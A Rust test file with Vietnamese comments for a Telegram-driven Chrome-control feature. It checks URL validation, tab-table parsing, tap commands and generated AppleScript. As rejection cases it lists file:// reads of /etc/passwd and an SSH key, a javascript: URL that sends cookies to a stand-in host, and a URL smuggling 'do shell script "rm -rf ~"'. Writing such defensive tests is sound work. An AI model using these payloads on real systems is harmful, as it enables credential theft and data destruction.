//! Cổng điều khiển trình duyệt: cái CỔNG, cái BẢNG, và đường về của cú chạm.
//!
//! Hà 2026-08-23: *"Cổng điều khiển browser thế nào rồi"*.
//!
//! Ba thứ ở đây đều thuần — không mở Chrome, không gọi `osascript`, không cần
//! quyền Tự động hoá. Đó là chủ ý: phần duy nhất KHÔNG kiểm được mà không có
//! máy thật là lời từ chối của macOS, nên mọi thứ còn lại phải kiểm được mà
//! không cần nó, không thì cả tính năng chỉ được nhìn thấy một lần lúc chạy tay.

use huba::adapters::CommandKind;
use huba::browser::{dia_chi_hop_le, doc_bang, Tab};
use huba::pipeline::{tap_rows_html, web_host, web_list_text, web_taps};
use huba::verbs::parse_command;

fn tab(win: usize, idx: usize, active: usize, url: &str, title: &str) -> Tab {
    Tab {
        win,
        idx,
        title: title.to_string(),
        url: url.to_string(),
        active: idx == active,
    }
}

/// 🔴 CỔNG, KHÔNG PHẢI PHÉP LÀM SẠCH. Chuỗi này đi từ một tin nhắn Telegram
/// thẳng vào trình duyệt **đang đăng nhập mọi thứ** của chủ máy.
///
/// Hai họ phải chết ngay tại đây, và mỗi họ là một loại thiệt hại khác nhau:
/// `file:` biến `/web` thành máy đọc trộm ổ đĩa (rồi trả về qua ảnh chụp màn),
/// còn `javascript:` chạy mã tuỳ ý TRONG phiên đăng nhập ấy — đúng thứ luật 1
/// của `CLAUDE.md` gọi là "không có tường".
#[test]
fn the_address_gate_refuses_the_two_families_that_matter() {
    for xau in [
        "file:///etc/passwd",
        "file:///Users/hanguyen/.ssh/id_rsa",
        "FILE:///etc/passwd",
        "javascript:alert(document.cookie)",
        "JavaScript:fetch('//kẻ-lạ/'+document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "chrome://settings/passwords",
        "about:config",
        "",
        "   ",
        // Có dấu cách ⟹ không phải một địa chỉ; nhận bừa là mở tab về một
        // trang tìm kiếm mang theo nguyên câu chủ máy vừa gõ.
        "mail.google.com rồi xoá hết thư",
        // Không có dấu chấm, không phải localhost ⟹ không trỏ vào đâu cả.
        "khongphaidiachi",
    ] {
        assert_eq!(dia_chi_hop_le(xau), None, "lọt cổng: {xau:?}");
    }
}

/// …và cho qua đúng thứ người ta thật sự gõ trên điện thoại.
#[test]
fn the_address_gate_lets_through_what_a_thumb_actually_types() {
    // Gõ đủ lược đồ thì giữ NGUYÊN VĂN — kể cả cổng và đường dẫn.
    assert_eq!(
        dia_chi_hop_le("https://github.com/tccnetwork/v4/pull/3").as_deref(),
        Some("https://github.com/tccnetwork/v4/pull/3")
    );
    assert_eq!(
        dia_chi_hop_le("http://127.0.0.1:9200/").as_deref(),
        Some("http://127.0.0.1:9200/")
    );
    // Không gõ lược đồ là chuyện thường: thêm `https://`, đừng bắt người ta nhớ
    // một luật của máy.
    assert_eq!(
        dia_chi_hop_le("mail.google.com").as_deref(),
        Some("https://mail.google.com")
    );
    // Dấu hai chấm SAU tên miền là số cổng, không phải một lược đồ lạ.
    assert_eq!(
        dia_chi_hop_le("localhost:9200").as_deref(),
        Some("https://localhost:9200")
    );
}

/// Bảng tab đọc từ AppleScript: hàng hỏng thì bỏ hàng ấy, và ĐẾM.
///
/// Đếm mới là vế quan trọng: bỏ qua mà im lặng thì "Chrome có 1 tab" và "huba
/// đọc hỏng 12 hàng" đọc lên giống hệt nhau — một phép đo không phân biệt được
/// hai chuyện ấy thì không dùng được để kết luận gì.
#[test]
fn a_broken_row_shrinks_the_list_but_never_silently() {
    let raw = "1\t1\t2\thttps://mail.google.com/\tGmail\n\
               1\t2\t2\thttps://github.com/x\tGitHub\n\
               hỏng hẳn\n\
               2\tkhông-phải-số\t1\thttps://a.b\tA\n";
    let (tabs, hong) = doc_bang(raw);
    assert_eq!(tabs.len(), 2, "{tabs:?}");
    assert_eq!(hong, 2, "hai hàng hỏng phải được đếm, không được nuốt");
    // `active tab index` = 2 ⟹ tab thứ 2 là tab đang xem, tab 1 thì không.
    assert!(!tabs[0].active);
    assert!(tabs[1].active);
    assert_eq!(tabs[0].url, "https://mail.google.com/");
    assert_eq!(tabs[1].title, "GitHub");
}

/// Tiêu đề có ký tự ngăn ô thì KHÔNG được cắt mất phần sau của nó.
///
/// `splitn(5, …)` để đúng chuyện này: tiêu đề là ô CUỐI, nên mọi dấu tab còn
/// lại thuộc về nó. Cắt bằng `split` trần thì một tiêu đề lạ làm hỏng cả hàng.
#[test]
fn a_tab_character_inside_a_title_does_not_eat_the_row() {
    let (tabs, hong) = doc_bang("1\t1\t1\thttps://a.b/\tTiêu\tđề\tlạ\n");
    assert_eq!(hong, 0);
    assert_eq!(tabs[0].title, "Tiêu\tđề\tlạ");
}

/// Tên miền là thứ người ta đọc để biết mình đang ở đâu.
#[test]
fn the_host_is_what_says_where_you_are() {
    assert_eq!(
        web_host("https://mail.google.com/mail/u/0/#inbox"),
        "mail.google.com"
    );
    assert_eq!(web_host("http://www.example.com/a/b"), "example.com");
    assert_eq!(web_host("https://127.0.0.1:9200/"), "127.0.0.1:9200");
}

/// Danh sách tab dùng ĐÚNG bố cục của danh sách phiên — cả hàng là đích chạm,
/// khoá tra cứu đứng cuối, không hàng nào tràn sang dòng thứ ba.
#[test]
fn the_tab_list_wears_the_same_shape_as_the_session_list() {
    huba::telegram::set_bot_username("hub_test_bot");
    let tabs = [
        tab(
            1,
            1,
            2,
            "https://mail.google.com/mail/u/0/#inbox",
            "Gmail — Hộp thư đến (12)",
        ),
        tab(
            1,
            2,
            2,
            "https://github.com/tccnetwork/v4/pull/3",
            "Một tiêu đề rất dài để xem chỗ cắt có đúng chỗ không, dài hơn cả bề ngang màn",
        ),
        tab(2, 1, 1, "https://127.0.0.1:9200/", ""),
    ];
    let text = web_list_text(&tabs);
    let taps = web_taps(&tabs);
    assert_eq!(taps.len(), 3);

    // Hàng nào cũng ≤ 76 ký tự ⟹ tối đa hai dòng nhìn thấy trên màn 390px.
    // (`cols` luôn ≥ số ký tự vì emoji tính hai cột, nên đây là hệ quả yếu hơn
    // nhưng ĐỘC LẬP của ngân sách cột — bài kiểm không gọi lại chính hàm nó gác.)
    for line in text.lines().filter(|l| l.contains(" · ")) {
        assert!(
            line.chars().count() <= 76,
            "hàng tab tràn dòng thứ ba ({} ký tự): {line}",
            line.chars().count()
        );
    }
    // Tab đang xem phải nhận ra được.
    assert!(text.lines().any(|l| l.starts_with("👁 ")), "{text}");
    // Trang chưa có tiêu đề vẫn phải có CHỮ, không để trống một hàng bấm được.
    assert!(text.contains("(chưa có tiêu đề)"), "{text}");

    let (html, wrapped) = tap_rows_html(&text, &taps);
    assert_eq!(wrapped, 3, "mỗi hàng một đích chạm:\n{html}");
    assert!(
        html.contains("https://t.me/hub_test_bot?start=wb_1_2"),
        "{html}"
    );
    // Dòng tiêu đề (`🌐 3 tab…`) KHÔNG phải đích chạm.
    assert_eq!(html.matches("<a href=").count(), 3, "{html}");
}

/// Cú chạm vào một hàng tab cởi ra thành đúng lệnh `/web <cửa sổ>.<tab>`.
///
/// Dấu `.` không nằm trong bộ ký tự Telegram cho phép ở `?start=`, nên payload
/// mang `_` rồi đổi lại — và chỗ đổi phải có bài kiểm, vì hai đầu lệch nhau ở
/// đúng chỗ này là cách `run_` từng gãy mà bài kiểm vẫn xanh.
#[test]
fn a_tap_on_a_tab_row_becomes_the_command_that_switches_to_it() {
    assert_eq!(
        parse_command("/start wb_1_2"),
        Some((CommandKind::Web, 0, "1.2".to_string()))
    );
    assert_eq!(
        parse_command("/start wb_2_11"),
        Some((CommandKind::Web, 0, "2.11".to_string()))
    );
    assert_eq!(parse_command("/start wb_1"), None);
    assert_eq!(parse_command("/start wb_x_1"), None);
    assert_eq!(parse_command("/start wb__1"), None);

    // Và route gõ tay vẫn là chính nó.
    assert_eq!(
        parse_command("/web"),
        Some((CommandKind::Web, 0, String::new()))
    );
    assert_eq!(
        parse_command("/web mail.google.com"),
        Some((CommandKind::Web, 0, "mail.google.com".to_string()))
    );
    // Alias tiếng Việt + tiếng Anh, vì cả hai đều đã được khai trong bảng lệnh.
    assert_eq!(
        parse_command("/trinhduyet"),
        Some((CommandKind::Web, 0, String::new()))
    );
}

/// Bốn đoạn AppleScript sinh ra phải ĐÚNG HÌNH DẠNG, và đây là chỗ duy nhất
/// soi được chúng mà không cần Chrome, không cần quyền Tự động hoá.
///
/// 🔴 `keys::window_script` tách ra thành hàm thuần vì đúng lý do này: lỗi đầu
/// tiên của tính năng ấy là một dòng thừa ở cuối chuỗi, bị cú pháp chuỗi thô
/// của Rust nuốt mất dấu nháy, và nó **chỉ lộ khi chạy thật** vì không có gì
/// soi chuỗi sinh ra. Ở đây thì có.
#[test]
fn every_script_asks_before_it_tells() {
    use huba::browser::{sc_open, sc_select, sc_tabs, sc_text};
    for (ten, sc) in [
        ("tabs", sc_tabs()),
        ("open", sc_open("https://example.com/a")),
        ("select", sc_select(2, 3)),
        ("text", sc_text()),
    ] {
        // Hỏi TRƯỚC khi sai bảo: `tell application` tự khởi động Chrome, và một
        // cửa sổ tự bật lên vì ai đó lỡ gõ `/web` là thứ ngồi ở máy không bao
        // giờ xảy ra.
        assert!(
            sc.starts_with("if application \"Google Chrome\" is running then"),
            "{ten}: mở đầu sai:\n{sc}"
        );
        assert!(
            sc.trim_end().ends_with("end if"),
            "{ten}: thiếu `end if`:\n{sc}"
        );
        assert_eq!(sc.matches("tell application").count(), 1, "{ten}:\n{sc}");
        assert_eq!(sc.matches("end tell").count(), 1, "{ten}:\n{sc}");
        // Nhánh "Chrome tắt" phải trả MỐC, không trả rỗng.
        assert!(sc.contains("OFF"), "{ten}: mất mốc Chrome-tắt:\n{sc}");
        // Số dấu nháy phải CHẴN — một chuỗi hở là một script hỏng cú pháp, và
        // đó đúng là hình dạng lỗi mà `window_script` từng trả giá.
        assert_eq!(sc.matches('"').count() % 2, 0, "{ten}: dấu nháy lẻ:\n{sc}");
    }
}

/// Một địa chỉ mang dấu nháy không được phép bẻ script làm đôi.
///
/// Cổng [`dia_chi_hop_le`] đã chặn dấu cách, nhưng KHÔNG chặn dấu nháy — một
/// URL hợp lệ có quyền mang `%22` đã giải mã, và chỗ nối chuỗi thì không biết
/// điều đó. Hai lớp, vì lớp nào cũng có thể bị sửa mà lớp kia không hay.
#[test]
fn a_quote_in_a_url_cannot_split_the_script() {
    use huba::browser::sc_open;
    let sc = sc_open("https://x.test/a\"; do shell script \"rm -rf ~\"");
    assert_eq!(sc.matches('"').count() % 2, 0, "dấu nháy lẻ:\n{sc}");
    // ⚠ Bản đầu của dòng này là `!sc.contains("\"; do shell")` — và nó ĐỎ trên
    // một script ĐÚNG. Chuỗi ấy khớp luôn vào bên trong chính dấu thoát
    // (`\\"; do shell`), tức phép đo không phân biệt được "chưa thoát" với "đã
    // thoát" — nó chỉ đo sự có mặt của mấy ký tự. Hỏi thẳng vế phải hỏi: dấu
    // nháy của URL có đi kèm dấu thoát ngay trước nó không.
    assert!(
        sc.contains(r#"a\"; do shell"#),
        "dấu nháy của URL chưa được thoát:\n{sc}"
    );
}
